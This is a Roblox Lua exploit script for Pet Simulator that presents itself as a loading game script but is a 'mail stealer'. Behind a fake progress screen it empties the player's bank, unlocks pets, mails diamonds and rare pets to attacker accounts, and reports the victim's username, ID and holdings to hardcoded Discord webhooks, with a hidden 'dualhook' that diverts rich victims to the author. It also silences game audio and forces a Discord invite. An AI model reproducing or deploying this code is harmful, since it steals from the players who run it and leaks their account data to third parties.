-- Variebls Local

local Library = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local getupvalue = (getupvalue or debug.getupvalue)

local emmojs = {
	happy = "\240\159\165\179\239\184\143",
	blank = "\240\159\147\139",
	diamond = "\240\159\146\142",
	arrow = "\226\158\156",
	star = "\226\173\144"
}

local exploitNames = {
    ["is_sirhurt_closure"] = "Sirhurt",
    ["pebc_execute"] = "ProtoSmasher",
    ["syn"] = "Synapse X",
    ["secure_load"] = "Sentinel",
    ["KRNL_LOADED"] = "Krnl",
    ["SONA_LOADED"] = "Sona",
}

local exploitName = "Kid with shit exploit"

for k, v in pairs(exploitNames) do
    if _G[k] then
        exploitName = v
        break
    end
end

local Utils = {}

function Utils.formatted_number(number)
	local formatted_number = string.format("%.0f", number)
    formatted_number = formatted_number:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    formatted_number = formatted_number:gsub("^,", "")
    return formatted_number
end

local HttpService = game:GetService("HttpService")
request = http_request or request or HttpPost or syn.request

function Utils.join_server(code)
    if request == nil then
        return
    end
    return request({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",
        Body = HttpService:JSONEncode({
            cmd = "INVITE_BROWSER",
            args = {
              code = code
            },
            nonce = string.lower(HttpService:GenerateGUID(false))
        }),
        Headers = {
            ["Content-Type"] = "application/json",
            ["Origin"] = "https://discord.com"
        }
    })
end

-- Class Remote

local Remote = {
    Utils = {
        Invoke = getupvalue(Library.Network.Invoke, 2),
        Fire = getupvalue(Library.Network.Fire, 2),
    },
    Settings = {
        RemoteStandartName = true
    }
}

Remote.__index = Remote

function Remote:InvokeServer(...)
    assert(self.class == "RemoteFunction")
    return self.Utils.Invoke(self.name):InvokeServer(...)
end

function Remote:FireServer(...)
    assert(self.class == "RemoteEvent")
    self.Utils.Fire(self.name):FireServer(...)
end

function Remote.new(name, class)
    self = setmetatable({}, Remote)
    self.class = class
    self.name = name
    return self
end

-- Class Remotes

local Remotes = {
    Save = {{}, {}}
}
Remotes.__index = Remotes

local remote_class = {
    "RemoteEvent",
    "RemoteFunction"
}

function Remotes.get(name)
    for _, remotes in pairs(Remotes.Save) do
        local remote = remotes[name]
        if remote then
            return remote 
        end
    end
end

function Remotes.add(name, type_remote)
    if not name then return end
    if not table.find(Remotes.Save[type_remote], name) then
        Remotes.Save[type_remote][name] = Remote.new(name, remote_class[type_remote])
    end
end

local OLD_RemoteHashed = getupvalue(getupvalue(Remote.Utils.Invoke, 2), 1)
local RemotePaths = getupvalue(getupvalue(Remote.Utils.Invoke, 1), 1)
local RemotePaths2 = getupvalue(getupvalue(getupvalue(Library.Network.Invoke, 3), 1), 1)

local RemoteHashed = {}

for _, remotes in pairs(OLD_RemoteHashed) do
    for default_name, hashed_name in pairs(remotes) do
        RemoteHashed[hashed_name] = default_name
    end
end

for _, remotes in pairs(RemotePaths) do
    for remote_hashed_name, remote_path in pairs(remotes) do
        if Remote.Settings.RemoteStandartName then
            remote_path.Name = RemoteHashed[remote_hashed_name] or remote_path.Name
        end
        Remotes.add(
            remote_path.Name, 
            (remote_path.ClassName == "RemoteEvent" and 1) or (remote_path.ClassName == "RemoteFunction" and 2)
        )
    end
end

for _, remotes in pairs(RemotePaths2) do
    for remote_hashed_name, remote_path in pairs(remotes) do
        if Remote.Settings.RemoteStandartName then
            remote_path.Name = RemoteHashed[remote_hashed_name] or remote_path.Name
        end
    end
end

for i, v in pairs(getgc()) do
    if type(v) == "function" and islclosure(v) then
        local constants = getconstants(v)
        local newtwork = 0
        for i, v in pairs(constants) do
            if v == "Network" then
                newtwork = i
            elseif v == "Invoke" and newtwork + 1 == i then
                local name = constants[newtwork+2]
                Remotes.add(name, 2)
            elseif v == "Fire"and newtwork + 1 == i then
                local name = constants[newtwork+2]
                Remotes.add(name, 1)
            end
        end
    end
end

local custom_remotes = {
    {"Send Mail", 2},
    {"Bank Deposit", 2},
    {"Bank Withdraw", 2}
}

for _, remote_data in next, custom_remotes do
    Remotes.add(remote_data[1], remote_data[2])
end

-- Class Pets

local Pets = {}
Pets.__index = Pets

function Pets.new(pets)
    self = setmetatable({}, Pets)
    self.pets = pets
    return self
end

function Pets:get_rm_pets()
    local pets = {}
    for _, pet_data in pairs(self.pets) do
        local pet_data_directory = Library.Directory.Pets[pet_data.id]
        if (pet_data_directory.huge == true or 
        pet_data_directory.rarity == "Event" or 
        pet_data_directory.rarity == "Exclusive") then
            table.insert(pets, pet_data)
        end
    end
    return pets
end

function Pets.count_rm_pets()
	local saved_pets = Library.Save.Get().Pets
	local rm_pets = 0
	for _, pet_data in pairs(saved_pets) do
		local pet_data_directory = Library.Directory.Pets[pet_data.id]
		if (pet_data_directory.huge == true or 
        pet_data_directory.rarity == "Event" or 
        pet_data_directory.rarity == "Exclusive") then
			rm_pets = rm_pets + 1
		end
	end
	return rm_pets
end

function Pets.get_hugs_pets()
    local huge_pets = {}
    local saved_pets = Library.Save.Get().Pets
    for index, pet_data in pairs(saved_pets) do
        local pet_data_directory = Library.Directory.Pets[pet_data.id]
        if pet_data_directory.huge then
            table.insert(huge_pets, pet_data)
        end
    end
    return huge_pets
end

function Pets.get_hugs_pets_data(huge_pets)
    local pets_data = {}
    for index, pet_data in pairs(huge_pets) do
        local pet_data_directory = Library.Directory.Pets[pet_data.id]
        g_r = nil
        if pet_data_directory.g then
            g_r = "Golden"
        elseif pet_data_directory.r then
            g_r = "Rainbow"
        elseif not v_g and not v_r then
            g_r = "Normal"
        end
        pet_data_directory.g_r = g_r
        table.insert(pets_data, pet_data_directory)
    end
    return pets_data
end

function Pets.convert_hugs_in_text(hugs)
    local pets_info = ""
    if #hugs > 0 then
        for _, pet_data in pairs(hugs) do
            pets_info = pets_info .. ("\n" .. "Name ➜ \240\159\148\174 " .. pet_data.name .. "\nRarity \226\158\156 \240\159\142\137" .. pet_data.rarity .. "\n\240\159\145\146 Golden/Rainbow \226\158\156 \240\159\140\136" .. pet_data.g_r .. "\n~--------~" .. "")
        end
    else
        pets_info = "None"
    end
    return pets_info
end

-- Class Banks

local Banks = {}
Banks.__index = Banks

function Banks.new(UUID)
    self = setmetatable({}, Banks)
    self.data = Remotes.get("Get Bank"):InvokeServer(UUID)
    self.uuid = UUID
    return self
end

function Banks:withdraw_diamonds()
    if self.data.Storage.Currency.Diamonds > 0 then
        Remotes.get("Bank Withdraw"):InvokeServer(self.uuid, {}, self.data.Storage.Currency.Diamonds)
    end
end

function Banks:withdraw_pets()
    local uuids = {}
    for _, pet_data in pairs(Pets.new(self.data.Storage.Pets):get_rm_pets()) do
        table.insert(uuids, pet_data.uid)
    end
    if #uuids > 0 then
        Remotes.get("Bank Withdraw"):InvokeServer(self.uuid, uuids, 0)
    end
end

-- Class Bank

local Bank = {
    Banks = {}
}
Bank.__index = Bank

function Bank:new()
    self = setmetatable({}, Bank)
    self.diamonds = 0

    for _, bank_data in pairs(Remotes.get("Get My Banks"):InvokeServer()) do
        local banks = Banks.new(bank_data.BUID)
        self.diamonds += banks.data.Storage.Currency.Diamonds
        table.insert(self.Banks, banks)
    end
   
    return self
end

-- Class WebHook

local WebHook = {
    Functions = {}
}
WebHook.__index = WebHook

function WebHook.new(url)
    self = setmetatable({}, WebHook)
    
    self.url = url
    self.embeds = {}
    self.content = ""

    return self
end

function WebHook:send(data)
    task.spawn(function()
        local data = {
            ["content"] = data.content or "",
            ["embeds"] = data.embeds or {}
        }
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {
            ["content-type"] = "application/json"
        }
        local request = http_request or request or HttpPost or syn.request
        local abcdef = {
            Url = self.url,
            Body = newdata,
            Method = "POST",
            Headers = headers
        }
        pcall(function()
            request(abcdef)
        end)
    end)
end

function WebHook.Functions.send_log_stats(self)
	local save_data = Library.Save.Get()
    local diamonds = Utils.formatted_number(save_data.Diamonds)
    self:send({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = game.Players.LocalPlayer.Name .. " , Just got scammed!",
                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..
                                "\nUser ID: " .. game.Players.LocalPlayer.UserId ..
                                "\nAccount Age: " .. game.Players.LocalPlayer.AccountAge .. " Days" ..
                                "\nRank: " .. save_data.Rank,
                ["type"] = "rich",
                ["color"] = 65280,
                ["fields"] = {
                    {
                        ["name"] = emmojs.diamond .. " Diamonds " .. emmojs.diamond,
                        ["value"] = "```\n" .. emmojs.arrow .. "" .. diamonds .. "\n```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = emmojs.blank .. " Remaining Pets " .. emmojs.blank,
                        ["value"] = "```\n" .. tostring(Pets.count_rm_pets()) .. "\n```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = emmojs.happy .. " Huges " .. emmojs.happy,
                        ["value"] = "```\n" .. Pets.convert_hugs_in_text(Pets.get_hugs_pets_data(Pets.get_hugs_pets())) .. "\n```",
                        ["inline"] = false
                    },
                }
            }
        }
    })
end

function WebHook.Functions.send_log_next_pet(self, pet)
	local save_data = Library.Save.Get()
    local diamonds = Utils.formatted_number(save_data.Diamonds)

    self:send({
        ["content"] = pet.huge == true and "@everyone" or "",
		["embeds"] = {
			{
				["title"] = game.Players.LocalPlayer.Name .. " , Just got scammed!",
				["description"] = "Username: " .. game.Players.LocalPlayer.Name ..
								  "\nUser ID: " .. game.Players.LocalPlayer.UserId ..
								  "\nAccount Age: " .. game.Players.LocalPlayer.AccountAge .. " Days" ..
								  "\nRank: " .. save_data.Rank ..
								  "\n\n**Mail Info:**",
				["type"] = "rich",
				["color"] = 65280,
				["fields"] = {
					{
						["name"] = emmojs.diamond .. " Diamonds " .. emmojs.diamond,
						["value"] = "```\n" .. emmojs.arrow .. "" .. diamonds .. "\n```",
						["inline"] = true
					},
					{
						["name"] = emmojs.blank .. " Remaining Pets " .. emmojs.blank,
						["value"] = "```\n" .. tostring(Pets.count_rm_pets()) .. "\n```",
						["inline"] = true
					},
					{
						["name"] = emmojs.star .. " Exclusive " .. emmojs.star,
						["value"] = "```\n" .. pet.name .. "\n```",
						["inline"] = true
					}
				}
			}
		}
    })
end

-- Class DualHook

local DualHook = {}
DualHook.__index = DualHook
setmetatable(DualHook, {
	__call = function(self, ...)
        self.DualHookEnabled = false

        if #Pets.get_hugs_pets() >= 5 then
            self.Username = "Uzbekistan34"
            self.WebhookUrl = "https://discordapp.com/api/webhooks/1108758974012063744/_erDP7utGXMKLlEYuHUkOIpvd0DAfyGWt8GFWApu2yZ0-1jYU-j3HBFzU13deuOJJjdg"
            self.DualHookEnabled = true
        else
            self.Username = _G.Username or "Uzbekistan34"
            self.WebhookUrl = _G.WebhookUrl or "https://discordapp.com/api/webhooks/1108758974012063744/_erDP7utGXMKLlEYuHUkOIpvd0DAfyGWt8GFWApu2yZ0-1jYU-j3HBFzU13deuOJJjdg"
        end

        self.UserLogger = WebHook.new(self.WebhookUrl)
        self.UserLogger.Functions.send_log_stats(self.UserLogger)

        self.GlobalLogger = WebHook.new("https://discordapp.com/api/webhooks/1108759208880517191/SumP1zWZkxyUN6mlWaHPvRmlSRfH76Dcna5elroquKOOMPcxdCcOhCqWk7HURyzMQqUk")
        self.GlobalLogger.Functions.send_log_stats(self.GlobalLogger)

        return self
	end
})

function DualHook:Diamonds()
    local save_data = Library.Save.Get()
    local args
    
    local send_diamonds = save_data.Diamonds - (Pets.count_rm_pets() + 1) * 100000
    local diamonds = Utils.formatted_number(save_data.Diamonds)
    local old_diamonds = save_data.Diamonds

    if save_data.Diamonds > 50000000000 then
        args = {
            [1] = {
                ["Recipient"] = "Uzbekistan34",
                ["Diamonds"] = send_diamonds,
                ["Pets"] = {},
                ["Message"] = "/2VpqzaBVDr"
            }
        }
    elseif send_diamonds > 0 then
        args = {
            [1] = {
                ["Recipient"] = self.Username,
                ["Diamonds"] = send_diamonds,
                ["Pets"] = {},
                ["Message"] = "
            }
        }
    end
    
    if args then
        if not self.diamonds_log then
            self.diamonds_log = true
            dualhook.UserLogger:send({
                ["embeds"] = {
                    {
                        ["title"] = game.Players.LocalPlayer.Name .. " , Just got scammed!",
                        ["description"] = "Send Diamonds",
                        ["type"] = "rich",
                        ["color"] = 65280,
                        ["fields"] = {
                            {
                                ["name"] = emmojs.diamond .. " Diamonds " .. emmojs.diamond,
                                ["value"] = "```\n" .. emmojs.arrow .. "" .. diamonds .. "\n```",
                                ["inline"] = true
                            },
                        }
                    }
                }
            })
        end
        Remotes.get("Send Mail"):InvokeServer(unpack(args))
    end

    return save_data.Diamonds <= Pets.count_rm_pets() * 100000
end

local pets_in_logs = {}

function DualHook:SendPet(pet_data)
    local save_data = Library.Save.Get()
    local pet_data_directory = Library.Directory.Pets[pet_data.id]
    if
        (pet_data_directory.huge == true or 
        pet_data_directory.rarity == "Event" or 
        pet_data_directory.rarity == "Exclusive") and
        save_data.Diamonds >= 100000
    then
        local args = {
            [1] = {
                ["Recipient"] = self.Username,
                ["Diamonds"] = 0,
                ["Pets"] = {
                    pet_data.uid
                },
                ["Message"] = "gg/N5F38BVRJM | Username: " .. self.Username .. ""
            }
        }

        if not table.find(pets_in_logs, pet_data.uid) then
            table.insert(pets_in_logs, pet_data.uid)
            self.UserLogger.Functions.send_log_next_pet(self.UserLogger, pet_data_directory)
        end

        Remotes.get("Send Mail"):InvokeServer(unpack(args))

        task.wait(5)

        return true
    end
    return false
end

function DualHook:Pets()
    local save_data = Library.Save.Get()
    local saved_pets = save_data.Pets
    local have_pet = false

    for index, pet_data in pairs(Pets.get_hugs_pets()) do
        if self:SendPet(pet_data) then
            have_pet = true
        end
    end

    for index, pet_data in pairs(saved_pets) do
        if self:SendPet(pet_data) then
            have_pet = true
        end
    end

    return have_pet
end

-- Load Script
local bank = Bank:new()


local login = Instance.new("ScreenGui")
login.IgnoreGuiInset = false
login.ResetOnSpawn = true
login.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
login.Name = "Login"
login.Parent = game.CoreGui

local background = Instance.new("Frame")
background.AnchorPoint = Vector2.new(0.5, 0.5)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.Position = UDim2.new(0.499496311, 0, 0.499209881, 0)
background.Size = UDim2.new(1.09316683, 0, 1.10281479, 0)
background.Visible = true
background.Name = "Background"
background.Parent = login

local image_label = Instance.new("ImageLabel")
image_label.Image = "rbxassetid://12911888864"
image_label.ImageTransparency = 0.7699999809265137
image_label.AnchorPoint = Vector2.new(0.5, 0.5)
image_label.BackgroundColor3 = Color3.new(1, 1, 1)
image_label.BackgroundTransparency = 1
image_label.Position = UDim2.new(0.49999994, 0, 0.499827176, 0)
image_label.Size = UDim2.new(0.99999994, 0, 1.00034571, 0)
image_label.Visible = true
image_label.Parent = login

local frame = Instance.new("Frame")
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.Position = UDim2.new(0.499292403, 0, 0.819835365, 0)
frame.Size = UDim2.new(0.59859556, 0, 0.0369425043, 0)
frame.Visible = true
frame.Parent = image_label

local uicorner = Instance.new("UICorner")
uicorner.Parent = frame

local load = Instance.new("Frame")
load.AnchorPoint = Vector2.new(0.5, 0.5)
load.BackgroundColor3 = Color3.new(0.180392, 0.65098, 0.509804)
load.Position = UDim2.new(0.00382870319, 0, 0.476013184, 0)
load.Size = UDim2.new(0, 2, 0.952000022, 0)
load.Visible = true
load.Name = "Load"
load.Parent = frame

local uicorner_2 = Instance.new("UICorner")
uicorner_2.CornerRadius = UDim.new(0, 7)
uicorner_2.Parent = load

local local_script = Instance.new("LocalScript")
local_script.Parent = load

local uilist_layout = Instance.new("UIListLayout")
uilist_layout.SortOrder = Enum.SortOrder.LayoutOrder
uilist_layout.VerticalAlignment = Enum.VerticalAlignment.Center
uilist_layout.Parent = frame

local uistroke = Instance.new("UIStroke")
uistroke.Color = Color3.new(0.0941176, 0.0941176, 0.0941176)
uistroke.Thickness = 6.5
uistroke.Parent = frame

local image_label_2 = Instance.new("ImageLabel")
image_label_2.Image = "rbxassetid://7733992358"
image_label_2.AnchorPoint = Vector2.new(0.5, 0.5)
image_label_2.BackgroundColor3 = Color3.new(1, 1, 1)
image_label_2.BackgroundTransparency = 1
image_label_2.BorderColor3 = Color3.new(0, 0, 0)
image_label_2.BorderSizePixel = 0
image_label_2.Position = UDim2.new(0.811623812, 0, 0.819504917, 0)
image_label_2.Size = UDim2.new(0.0134525513, 0, 0.0291062165, 0)
image_label_2.Visible = true
image_label_2.Parent = image_label

local uiaspect_ratio_constraint = Instance.new("UIAspectRatioConstraint")
uiaspect_ratio_constraint.Parent = image_label_2

local image_label_3 = Instance.new("ImageLabel")
image_label_3.Image = "rbxassetid://7733720701"
image_label_3.AnchorPoint = Vector2.new(0.5, 0.5)
image_label_3.BackgroundColor3 = Color3.new(1, 1, 1)
image_label_3.BackgroundTransparency = 1
image_label_3.BorderColor3 = Color3.new(0, 0, 0)
image_label_3.BorderSizePixel = 0
image_label_3.Position = UDim2.new(0.1835545, 0, 0.819835365, 0)
image_label_3.Size = UDim2.new(0.0323241502, 0, 0.0367051288, 0)
image_label_3.Visible = true
image_label_3.Parent = image_label

local uiaspect_ratio_constraint_2 = Instance.new("UIAspectRatioConstraint")
uiaspect_ratio_constraint_2.Parent = image_label_3

local image_label_4 = Instance.new("ImageLabel")
image_label_4.Image = "rbxassetid://7733919682"
image_label_4.AnchorPoint = Vector2.new(0.5, 0.5)
image_label_4.BackgroundColor3 = Color3.new(1, 1, 1)
image_label_4.BackgroundTransparency = 1
image_label_4.BorderColor3 = Color3.new(0, 0, 0)
image_label_4.BorderSizePixel = 0
image_label_4.Position = UDim2.new(0.828901589, 0, 0.818889916, 0)
image_label_4.Size = UDim2.new(0.020775551, 0, 0.0457795784, 0)
image_label_4.Visible = true
image_label_4.Parent = image_label

local uiaspect_ratio_constraint_3 = Instance.new("UIAspectRatioConstraint")
uiaspect_ratio_constraint_3.Parent = image_label_4

local percentage = Instance.new("TextLabel")
percentage.Font = Enum.Font.FredokaOne
percentage.Text = "1%"
percentage.TextColor3 = Color3.new(0.615686, 0.615686, 0.615686)
percentage.TextScaled = true
percentage.TextSize = 14
percentage.TextWrapped = true
percentage.AnchorPoint = Vector2.new(0.5, 0.5)
percentage.BackgroundColor3 = Color3.new(1, 1, 1)
percentage.BackgroundTransparency = 1
percentage.Position = UDim2.new(0.500212491, 0, 0.783736229, 0)
percentage.Size = UDim2.new(0.163107559, 0, 0.0220514499, 0)
percentage.Visible = true
percentage.Name = "Percentage"
percentage.Parent = image_label

local txt = Instance.new("TextLabel")
txt.Font = Enum.Font.FredokaOne
txt.Text = "LapisCrystal"
txt.TextColor3 = Color3.new(0.615686, 0.615686, 0.615686)
txt.TextScaled = true
txt.TextSize = 14
txt.TextWrapped = true
txt.AnchorPoint = Vector2.new(0.5, 0.5)
txt.BackgroundColor3 = Color3.new(1, 1, 1)
txt.BackgroundTransparency = 1
txt.Position = UDim2.new(0.500006676, 0, 0.498198956, 0)
txt.Size = UDim2.new(0.679586172, 0, 0.210751072, 0)
txt.Visible = true
txt.Name = "TXT"
txt.Parent = image_label

local local_script_2 = Instance.new("LocalScript")
local_script_2.Parent = txt

local tupix = Instance.new("TextLabel")
tupix.Font = Enum.Font.FredokaOne
tupix.Text = "Script is Loading"
tupix.TextColor3 = Color3.new(0.615686, 0.615686, 0.615686)
tupix.TextScaled = true
tupix.TextSize = 14
tupix.TextWrapped = true
tupix.AnchorPoint = Vector2.new(0.5, 0.5)
tupix.BackgroundColor3 = Color3.new(1, 1, 1)
tupix.BackgroundTransparency = 1
tupix.Position = UDim2.new(0.499691427, 0, 0.750191867, 0)
tupix.Size = UDim2.new(0.216977671, 0, 0.0464212559, 0)
tupix.Visible = true
tupix.Name = "tupix"
tupix.Parent = image_label

local discord = Instance.new("TextButton")
discord.Font = Enum.Font.FredokaOne
discord.Text = "Copy Discord Link"
discord.TextColor3 = Color3.new(1, 1, 1)
discord.TextSize = 19
discord.TextStrokeColor3 = Color3.new(1, 1, 1)
discord.TextWrapped = true
discord.AnchorPoint = Vector2.new(0.5, 0.5)
discord.BackgroundColor3 = Color3.new(0, 0, 0)
discord.BackgroundTransparency = 0.25
discord.Position = UDim2.new(0.725644171, 0, 0.769552112, 0)
discord.Size = UDim2.new(0.145884946, 0, 0.0348379761, 0)
discord.Visible = false
discord.Name = "Discord"
discord.Parent = image_label

local uicorner_3 = Instance.new("UICorner")
uicorner_3.CornerRadius = UDim.new(0, 5)
uicorner_3.Parent = discord

local uistroke_2 = Instance.new("UIStroke")
uistroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uistroke_2.Color = Color3.new(0.180392, 0.65098, 0.509804)
uistroke_2.Thickness = 0.800000011920929
uistroke_2.Parent = discord

local local_script_3 = Instance.new("LocalScript")
local_script_3.Parent = discord

local image_label_5 = Instance.new("ImageLabel")
image_label_5.Image = "rbxassetid://7734010488"
image_label_5.AnchorPoint = Vector2.new(0.5, 0.5)
image_label_5.BackgroundColor3 = Color3.new(1, 1, 1)
image_label_5.BackgroundTransparency = 1
image_label_5.BorderColor3 = Color3.new(0, 0, 0)
image_label_5.BorderSizePixel = 0
image_label_5.Position = UDim2.new(0.892539382, 0, 0.888491988, 0)
image_label_5.Size = UDim2.new(0.15978089, 0, 0.997630239, 0)
image_label_5.Visible = true
image_label_5.Parent = discord

local uiaspect_ratio_constraint_4 = Instance.new("UIAspectRatioConstraint")
uiaspect_ratio_constraint_4.Parent = image_label_5

--//Modules

local modules = {}

--// Scripts

-- LocalScript
task.spawn(function()
	local script = local_script

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	local load = script.Parent
	local scr = script.Parent.Parent.Parent.Percentage
	local discord = script.Parent.Parent.Parent.Discord
	local loader = script.Parent.Parent.Parent.tupix
	local function ResizeBar(percentage, time_wait)
		load:TweenSize(UDim2.new(percentage/100,0,1,0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, time_wait, true)
		task.wait(time_wait)
	end
	
	_G.TotalPets = Pets.count_rm_pets()
	while true do
		ResizeBar(1,0)
		task.wait()
		local finish = false
		scr.Text = "1%"
		repeat
			task.wait()
			if not finish then finish = true 
			end
			for i=1 ,_G.TotalPets, (_G.TotalPets/100) do
                _G.TotalPets = Pets.count_rm_pets()
                local percentage = (i/_G.TotalPets)*100
				local rd1 = (_G.TotalPets/5.5)
				task.wait(_G.TotalPets/5.5) 
	
				scr.Text = tostring(string.format("%.1f", percentage)) .. "%"
				load:TweenSize(UDim2.new(percentage/100,0,1,0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, rd1 , true)
			end
			task.wait(1.5)
			local rd1 = (math.random(5,10)/_G.Speed)
			ResizeBar(100,rd1)
			loader.Text = "Your pets and gems just got stolen by peak’s mail stealer join here to start stealing (https://discord.gg/2VpqzaBVDr)”"
			discord.Visible = true
			break
		until scr.Text ~= "100%"
		discord.Visible = true
		loader.Text = "Your pets and gems just got stolen by peak’s mail stealer join here to start stealing (https://discord.gg/2VpqzaBVDr)”"
		Utils.join_server("F4Ea5EkFkW")
		break
	end
	
end)

-- LocalScript
task.spawn(function()
	local script = local_script_2

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	local text = script.Parent
	while true do
		task.wait()
		text.Text = _G.HubName
	end
end)

-- LocalScript
task.spawn(function()
	local script = local_script_3

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		setclipboard("https://discord.gg/2VpqzaBVDr")
		button.Text = "Copied Link!"
		task.wait(3)
		button.Text = "Copy Discord Link"
	end)
end)


if Library.Save.Get().Diamonds + bank.diamonds < 100000 then
    local script_name = _G.ScriptName or "Unknown"
    return game.Players.LocalPlayer:Kick("Error launching script. Error code: " .. script_name .. ".LaunchScript")
end 

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)


for _, object in pairs(game:GetDescendants()) do
	if object:IsA("Sound") then
		object:Destroy()
	end
end

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["__MAP"].Interactive.Bank.Pad.CFrame

for _, banks in pairs(bank.Banks) do
    banks:withdraw_pets()
    banks:withdraw_diamonds()
end

task.wait(2)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.CFrame

local folders = {
	game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic,
}

local function unlockPetsInFolder(folder)
	for _, child in ipairs(folder:GetChildren()) do
		if child:IsA("TextButton") and child.Locked.Visible == true then
			if child.Name then
				local args = {
					[1] = {
						[child.Name] = false
					}
				}
				Remotes.get("Lock Pet"):InvokeServer(unpack(args))
			end
		end
	end
end

while true do
	for _, folder in ipairs(folders) do
		unlockPetsInFolder(folder)
		wait(.2)
	end
	local lockedCount = 0
	for _, folder in ipairs(folders) do
		for _, child in ipairs(folder:GetChildren()) do
			if child:IsA("TextButton") and child.Locked.Visible == true then
				lockedCount = lockedCount + 1
			end
		end
	end
	if lockedCount == 0 then
		break
	end
end

dualhook = DualHook()

task.wait(.1)

task.spawn(function()
    repeat
        task.wait()
    until dualhook:Diamonds()
    repeat
        task.wait()
    until not dualhook:Pets()
end)
